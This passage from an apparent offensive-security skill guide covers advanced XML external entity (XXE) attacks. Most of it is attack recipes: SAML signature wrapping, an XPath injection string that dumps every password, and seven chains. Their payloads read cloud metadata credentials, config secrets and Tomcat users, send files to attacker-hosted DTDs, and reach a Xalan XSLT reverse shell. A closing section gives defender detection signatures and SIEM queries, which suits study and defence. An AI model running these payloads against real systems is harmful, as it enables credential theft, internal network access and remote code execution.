    <Subject>admin@example.com</Subject>
  </Assertion>
</samlp:Response>
```

The signature checks `assertion-1` (unchanged, valid). But the SAML processing code uses the first-or-last `<Assertion>` element as the effective assertion, which may be `assertion-2`. Attacker forges an admin login without invalidating the signature.

**XXE composition:**

Combined with pre-signature parsing, an attacker can:
1. Include an entity definition in the outer envelope (not covered by the signature).
2. Reference the entity from a wrapped assertion the processor uses.
3. The signature-verification check passes (signed content is unchanged).
4. The processor sees the wrapped assertion with entity-expanded content — file bytes or SSRF-fetched content.

**Detection:**

- Send a SAML response with a valid signature and an added wrapped element containing a DOCTYPE entity.
- If the signature-verification passes AND the parse fires (OAST hit), both classes are live.
- Some SAML libraries (Shibboleth, some SimpleSAMLphp versions) apply signature-first — no wrapping.

**Historical CVE:**

Multiple SAML signature-wrapping CVEs across libraries (2011 disclosure by Somorovsky et al. "On Breaking SAML"). Each library-specific expression has its own advisory. Verify the library version against the vendor's advisory list.

## XPath and XQuery Adjacent Surfaces

XPath and XQuery are query languages over XML. Their attack surface is XML-parsing-adjacent but distinct.

**XPath injection:**

A query built by string-concatenation with user input:
```java
XPath xpath = XPathFactory.newInstance().newXPath();
String query = "//user[@name='" + userInput + "']/password/text()";
xpath.evaluate(query, doc);
```

Injection: `userInput = "admin' or '1'='1"` → query becomes `//user[@name='admin' or '1'='1']/password/text()` → returns all passwords.

**XPath-injection vs SQL-injection shape:**

Same class of defect (string-concat with untrusted input into a query language). XPath's expressive power is less than SQL (no arbitrary function calls in standard XPath 1.0/2.0), but XPath extensions can reach further.

**XQuery adds function calls:**

XQuery is a superset of XPath with `let` bindings, module imports, and function calls. When a target uses XQuery, injection reaches more capability. `let $x := doc('file:///etc/passwd')` reads files.

**XPath 2.0 / XPath 3.0 extension functions:**

- `fn:doc()`, `fn:collection()` — retrieve external XML documents. Reachable when the target implementation supports them.
- `saxon:evaluate()` (Saxon-specific) — evaluates a string as XPath, enabling injection composition.
- `math:*`, `array:*`, `map:*` — XPath 3.0 additions; not security-relevant per se.

**XPath injection oracles:**

- **Boolean-based** — modify the expression to control the returned node-set size; count-based response distinguishes true from false.
- **Error-based** — inject a shape that produces a parse error; error message may include context.
- **Time-based (XQuery only)** — use a computation-heavy expression as a delay oracle.
- **Union-based analog** — combine multiple sub-expressions with `|` to extract additional nodes.

**XPath does not have XXE surface itself** — but the XML being queried does. An XPath query over an untrusted XML document inherits the parser's XXE surface.

## Composite Chains

**Chain 1 — SVG upload → XXE → cloud metadata:**

1. Web app has a profile-picture upload accepting SVG.
2. The upload processor calls `convert user.svg preview.png` (Imagick).
3. Craft SVG with DOCTYPE + `<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">`.
4. Upload → Imagick's XML parser resolves entity → HTTP fetch to metadata endpoint → entity content appears in rendered PNG or in error log.
5. Route metadata-reachability to `cloud/aws.md` for the token-extraction chain.

**Chain 2 — SAML pre-signature parsing → password disclosure:**

1. Identify target's ACS endpoint (SAML SP).
2. Send a SAML Response with a DOCTYPE + `<!ENTITY xxe SYSTEM "file:///var/www/config/secrets.yml">` in the assertion.
3. Server parses the assertion (pre-signature) → resolves entity → file content reaches the DOM.
4. Server verifies signature → invalid → 403 response, but the parse-time OAST already fired with file content in URL.
5. Chain into config-file-driven secondary access.

**Chain 3 — Content-type-switch → XXE → SSRF → internal admin API:**

1. JSON API endpoint at `/api/orders`; normal use returns order data.
2. Resend with `Content-Type: application/xml` and XML body — response reveals a different content path, XML parser is live.
3. XXE payload with `<!ENTITY x SYSTEM "http://127.0.0.1:9090/admin/config">` — internal admin API port.
4. Response contains admin config content — SSRF to internal-only service confirmed.
5. Route to `ssrf.md` for the internal-target catalog and further pivots.

**Chain 4 — OOXML DOCX + XXE + parameter-entity OOB:**

1. Target: a DOCX processing service (a resume upload, a report generator, a document converter).
2. Craft a DOCX with `word/document.xml` containing DOCTYPE + external DTD reference to attacker-controlled `x.dtd`.
3. `x.dtd` implements the parameter-entity OOB chain (see Parameter Entity OOB Depth section above).
4. Upload → DOCX extractor unzips → XML parser fetches attacker DTD → entity chain runs → file content exfiltrated to OAST.
5. Reads: `.aws/credentials` if the extractor runs on an EC2 instance with an instance profile; `/etc/shadow` if root; per-tenant config files depending on the extraction service's identity.

**Chain 5 — RSS/Atom feed poisoning → server-side XXE → private-network SSRF:**

1. Target: a feed-aggregator service (Slack integration, IFTTT-style, or a corporate feed reader).
2. Register a malicious RSS feed under an attacker-controlled URL — the feed's XML contains DOCTYPE + entity payload.
3. Trigger the aggregator to fetch the feed (subscribe, add-feed action, or wait for the aggregator's periodic refresh).
4. Aggregator parses the fetched XML → entity resolution runs → SSRF fetch to internal service.
5. Report shape: an attacker-registered feed URL becomes the injection vector; the target's server-side processor becomes the SSRF client.

**Chain 6 — Egress-free XXE via local-DTD reuse → sensitive config disclosure:**

1. Target: internal SOAP service with strict egress firewall (no outbound HTTP allowed).
2. Standard OOB XXE fails because no outbound egress.
3. Read local `/etc/os-release` via error-based (if available) to fingerprint the distribution.
4. Choose the local-DTD matching the distro (e.g., `/usr/share/xml/fontconfig/fonts.dtd` on Ubuntu).
5. Construct the local-DTD-reuse payload (see Egress-Free Multi-DTD Depth section above) with `%constant` overridden and file target set to `/var/lib/tomcat9/conf/tomcat-users.xml`.
6. Parse error surfaces the file content — Tomcat user credentials disclosed.
7. Chain into Tomcat Manager access via disclosed credentials (route to `frameworks/java_spring.md` or the Tomcat-specific skill).

**Chain 7 — XSLT engine RCE via Java Xalan (legacy target):**

1. Target: legacy Java report engine (JasperReports pre-6.0 or similar) accepting user-uploaded XSLT stylesheets.
2. Upload XSLT with Xalan `xalan://` extension namespace + `java.lang.Runtime.exec` call.
3. Report engine transforms an XML data source using the uploaded stylesheet.
4. Xalan resolves the extension namespace → loads `java.lang.Runtime` → executes shell command.
5. Reverse shell to attacker-controlled listener; RCE as the Java process identity.

## XXE Post-Fix Detection

Target-side verification of XXE fixes shares structure with path-traversal fix detection but with XML-specific probes.

**Behavioral fix-signature probes per parser hardening:**

- **`disallow-doctype-decl=true` (Java DBF/SAX)** — the parser rejects any DOCTYPE with a `SAXParseException: DOCTYPE is disallowed`. Probe: `POST /xml-endpoint` with `<!DOCTYPE r [<!ENTITY x "MARKER">]><r>&x;</r>` — if response contains the DOCTYPE-disallowed error, hardening is applied. If response contains `MARKER`, entity expansion is live.
- **`XMLInputFactory` (StAX) with `SUPPORT_DTD=false` and `IS_SUPPORTING_EXTERNAL_ENTITIES=false`** — StAX rejects entity references but silently accepts DOCTYPE-only. Probe: `<!DOCTYPE r [<!ENTITY x SYSTEM "http://<oast>/x">]><r/>` — no OAST hit and no error mentioning DOCTYPE = both features off. OAST hit = external entities live.
- **libxml2 default** — accepts DOCTYPE, expands internal entities, does not resolve external entities. Probe: `<!DOCTYPE r [<!ENTITY x SYSTEM "http://<oast>/x">]><r>&x;</r>` — response contains "entity 'x' not defined" error means external-entity resolution off (default). Response contains the fetched content OR OAST hit = external-entity resolution enabled (opt-in, misconfiguration).
- **.NET `XmlReader.Create` default (`.NET 6+`)** — the reader rejects DOCTYPE with `XmlException: For security reasons DTD is prohibited`. Probe: DOCTYPE-containing payload → observe rejection.

**Multi-endpoint parity check:**

XXE hardening must apply at every endpoint. Probe:
1. Main API endpoint with the XXE payload.
2. SOAP endpoint (if present).
3. SAML ACS (if present).
4. File-upload endpoints accepting XML/SVG/DOCX.
5. Webhook endpoints accepting XML.
6. Background-job / import endpoints that parse XML later.

Any endpoint that produces a different response (entity resolved when others reject) is the residual class exposure.

**XInclude survival check:**

Even after DOCTYPE hardening, XInclude may still be enabled. Probe: `<r xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/hostname"/></r>` — hostname in response = XInclude survives DOCTYPE hardening.

**XSLT survival check:**

If the target has transform endpoints, probe with an XSLT containing `document('http://<oast>/x')` — OAST hit = XSLT-side external resolution live even if entity resolution is disabled.

## XXE Detection Signatures for Defenders

Defender-side detection signatures during XXE exploitation. Any authorized assessment overlapping purple-team scope should align probes with these signatures.

**Network-layer signatures:**

- Outbound DNS queries from application servers to unusual TLDs (`*.oast.fun`, `*.burpcollaborator.net`, `*.oastify.com`, DNS resolver logs with rapid queries against unknown subdomains).
- Outbound HTTP/HTTPS from application-tier servers to attacker-hosted DTDs — flag connections initiated by processes that are XML parsers (JVM heap, PHP-FPM child, Python worker) not the primary web server process.
- SMTP or FTP egress from application servers — some XXE payloads use `ftp://` or `mailto:` schemes.

**Log-layer signatures:**

- Web server error logs containing "DOCTYPE" — most WAFs flag DOCTYPE in POST bodies; SIEM rule on "DOCTYPE" appearing in request bodies to non-XML-expected endpoints is high-signal.
- Application error logs containing SAXParseException, XMLStreamException, XMLReaderException with entity-related messages.
- Application logs surfacing XML entity-resolution attempts against `file://` schemes.

**Compensating controls that reduce exposure:**

- Container-level egress restrictions — XXE payloads that reach external servers require outbound; a container with no outbound loses OAST-based exfil.
- WAF signatures for DOCTYPE in POST bodies — blocks the naive class; egress-free local-DTD attacks may still succeed.
- Content-Security-Policy for uploaded XML files served back — reduces browser-side XSS chained from XXE-modified content.

**SIEM query examples:**

```
# Splunk / KQL — DOCTYPE in POST bodies to non-XML endpoints
index=web_access method=POST body:*<!DOCTYPE*
NOT ( uri:*.xml OR uri:*.svg OR content_type:*xml* )
| stats count by src_ip, uri, content_type

# Outbound HTTP from JVM processes to external hosts (not in allowlist)
index=firewall_logs src_ip IN (app_tier_ips)
process_name IN (java, tomcat, spring)
dest_domain NOT IN (approved_external_apis)
| stats count by src_ip, dest_domain, process_name
```

These signatures cover the OAST-based XXE class; the egress-free class (local-DTD reuse) requires filesystem-level auditd rules to detect the file-read pattern.

## Summary

Advanced XXE depth is about the composition of the parser configuration, the sink shape, and the confirmation surface — parameter-entity OOB when the response doesn't reflect, XInclude/XSLT when entity resolution is disabled, egress-free multi-DTD when outbound is blocked, content-type switching when the endpoint's default parser is XML-adjacent, SAML pre-signature parsing when the XML runs before signature verification, and OOXML/SVG repackaging when the payload delivery is via document uploads. Fingerprint the parser at each endpoint independently; confirm the strongest available oracle; escalate through the composite chains routed to sibling skills.
